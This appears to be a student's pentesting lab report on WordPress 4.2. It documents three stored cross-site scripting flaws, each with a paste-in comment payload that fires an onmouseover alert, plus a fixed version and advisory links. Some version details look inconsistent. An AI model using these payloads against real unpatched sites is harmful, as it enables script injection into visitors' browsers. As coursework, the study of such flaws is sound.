#Project 7 - Wordpress Pentesting

Time spent: 1 hours spent in total

> Objective: Find, analyze, recreate, and coument vulnerabilities affecting WordPress v4.2

## Pentesting Report

1. (Required) Authenticated Stored Cross-Site Scripting (XSS)

-[x] Summary:
    1. Vulnerability types: XSS
    2. Tested in version: 4.2
    3. Fixed in version: 4.2.3
    4. GIF Walkthrough:
        ![Alt Text]https://i.gyazo.com/761f2461ed3ce9dfc6b94d6e170e7035.mp4

    5. Steps to recreate: Make a comment with
        <a href="[caption code=">]</a><a title = " onmouseover=alert('testalert')  ">link</a>

    6. Affected source code: https://klikki.fi/adv/wordpress3.html

2. (Required) Unauthenticated Stored Cross-Site Scripting (XSS)

-[x] Summary:
    1. Vulnerability types: XSS
    2. Tested in version: 4.2
    3. Fixed in version: 4.4.1.8
    4. GIF Walkthrough:
        ![Alt Text]https://gyazo.com/3b8e1e695be57eb746cbdc125da0b79e
    5. Steps to recreate: Make a comment with
    <a title='x onmouseover=alert(unescape(/hello%20world/.source))
    style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>

    6. Affected source code: https://klikki.fi/adv/wordpress2.html

3. (Required) User List Table Cross-Site Scripting (XSS)

-[x] Summary:
    1. Vulnerability types: XSS
    2. Tested in version: 4.2
    3. Fixed in version: 4.4.1.8
    4. GIF Walkthrough:
        ![Alt Text]https://gyazo.com/969c2f6fc7dbbb7c118b6a45ab868d8c

    5. Steps to recreate: Make a comment with
         <p>TEST!!!<figure style="width: 1px;" class="wp-caption alignnone"><figcaption class="wp-caption-text">
         <a href="</figcaption></figure></a><a href="http://onMouseOver='alert(1)'">Click me</a></p>

    6. Affected source code: https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/